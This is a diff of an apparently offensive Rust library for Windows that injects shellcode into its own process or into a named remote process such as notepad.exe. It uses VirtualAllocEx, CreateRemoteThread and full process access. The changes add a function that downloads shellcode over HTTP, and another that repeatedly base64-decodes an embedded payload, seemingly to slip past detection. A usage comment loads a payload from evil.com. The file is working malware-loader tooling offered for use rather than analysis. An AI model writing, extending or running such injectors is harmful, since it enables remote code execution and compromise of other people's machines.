@@ -1,8 +1,6 @@
 // ================
 // Standard Library
 // ================
-use std::error::Error;
-use std::fmt;
 use std::ptr;
 use core::ffi::c_void;
 // =====================
@@ -28,13 +26,10 @@ use windows::{
                 PAGE_READWRITE,
                 PAGE_EXECUTE_READ,
             },
-            ProcessStatus::EnumProcesses,
             Threading::{
                 INFINITE,
                 OpenProcess,
                 CreateRemoteThread,
-                GetCurrentProcessId,
-                GetProcessId,
                 GetCurrentProcess,
                 PROCESS_ALL_ACCESS,
                 WaitForSingleObject
@@ -43,11 +38,14 @@ use windows::{
     },
 };
 use sysinfo::{ProcessExt, System, SystemExt, PidExt};
+use reqwest::blocking::get;
+use base64::{Engine as _, engine::general_purpose};
 
 // ================
 // Internal Modules
 // ================
 pub mod embedded;
+pub mod b64embedded;
 
 
 ///
@@ -73,7 +71,7 @@ pub enum InjectorType {
 /// `Reflective` and `Remote` are supported.
 /// 
 pub enum InjectionType {
-    Reflective,
+    Reflect,
     Remote(String)
 }
 
@@ -89,6 +87,8 @@ pub enum InjectionType {
 /// ```
 /// let url_injector = UrlInjector::new()
 ///     .load(Url("https://evil.com/shellcode.bin"))?;
+///     .wait(true)?
+///     .inject(InjectionType::Remote("notepad.exe".to_string()))?
 ///     
 /// url_injector.inject();
 /// ```
@@ -97,30 +97,21 @@ pub enum InjectionType {
 /// options to easily be built in the future.
 /// 
 pub trait Injector {
-    fn load(self, sc_source: InjectorType) -> Result<Self, InjectorError> where 
+    fn load(self, sc_source: InjectorType) -> Result<Self, String> where 
         Self: Sized;
 
-    fn wait(self) -> Self;
+    fn wait(self, wait: bool) -> Result<Self, String>  where 
+        Self: Sized;
     
-    fn inject(&self, injection_type: InjectionType, wait: bool) -> Result<(), InjectorError>;
+    fn inject(&self, injection_type: InjectionType) -> Result<(), String>;
     
-}
-#[derive(Debug)]
-pub struct InjectorError(String);
-
-impl Error for InjectorError {}
-
-impl fmt::Display for InjectorError {
-    fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {
-        write!(f, "{}", self.0)
-    }
 }
 
 ///
 /// The generic function to write memory to either
 /// our own our another process, depending on the handle.
 /// 
-pub unsafe fn write_mem(sc: &Vec<u8>, proc_h: HANDLE, base_addr: *mut c_void, wait: bool) -> Result<(), InjectorError> {
+pub unsafe fn write_mem(sc: &Vec<u8>, proc_h: HANDLE, base_addr: *mut c_void, wait: bool) -> Result<(), String> {
 
     let sc_len = sc.len();
     let mut n = 0;
@@ -158,7 +149,7 @@ pub unsafe fn write_mem(sc: &Vec<u8>, proc_h: HANDLE, base_addr: *mut c_void, wa
         } else {
             let error = GetLastError();
             println!("{:?}", error);
-            Err(InjectorError("Could not inject!".to_string()))
+            Err("Could not inject!".to_string())
         }
     } else {
         Ok(())
@@ -169,7 +160,7 @@ pub unsafe fn write_mem(sc: &Vec<u8>, proc_h: HANDLE, base_addr: *mut c_void, wa
 ///
 /// Performs reflective injection.
 ///  
-pub unsafe fn reflective_inject(sc: &Vec<u8>, wait: bool) -> Result<(), InjectorError> {
+pub unsafe fn reflective_inject(sc: &Vec<u8>, wait: bool) -> Result<(), String> {
     let h: HANDLE = GetCurrentProcess();
     let addr = VirtualAllocEx(h, Some(ptr::null_mut()), sc.len(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
         
@@ -182,7 +173,7 @@ pub unsafe fn reflective_inject(sc: &Vec<u8>, wait: bool) -> Result<(), Injector
 /// 
 /// Will attempt to find a process with the given name and inject.
 ///  
-pub unsafe fn remote_inject(sc: &Vec<u8>, process_name: &str, wait: bool) -> Result<(), InjectorError>{
+pub unsafe fn remote_inject(sc: &Vec<u8>, wait: bool, process_name: &str) -> Result<(), String>{
 
 
     // Enumerate processes
@@ -197,10 +188,34 @@ pub unsafe fn remote_inject(sc: &Vec<u8>, process_name: &str, wait: bool) -> Res
             let addr = VirtualAllocEx(h, Some(ptr::null_mut()), sc.len(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);              
             write_mem(sc, h, addr, wait)
         },
-        None => Err(InjectorError("Could not find matching process!".to_string()))
+        None => Err("Could not find matching process!".to_string())
+    }   
+}
+
+pub fn download_shellcode(url: &str) -> Result<Vec<u8>, String> {
+    if let Ok(res) = get(url) {
+        if res.status().is_success() {
+            let sc: Vec<u8> = res.bytes().unwrap().to_vec();
+            return Ok(sc);
+        }
+        Err("Couldn't download shellcode!".to_string())
+    } else {
+        Err("Couldn't connect!".to_string())
     }
-    
+}
 
-
-       
+pub fn decode_b64_shellcode(sc: &Vec<u8>, b64_iterations: usize) -> Result<Vec<u8>, String> {
+    let mut shellcode_vec: Vec<u8> = sc.to_vec();
+    for _i in 0..b64_iterations {
+        match general_purpose::STANDARD.decode(shellcode_vec) {
+            Ok(d) => {
+                shellcode_vec = d;
+            },
+            Err(e) => { 
+                let err_msg = e.to_string();
+                return Err(err_msg.to_owned()); 
+            }
+        };
+    }
+    Ok(shellcode_vec)
 }
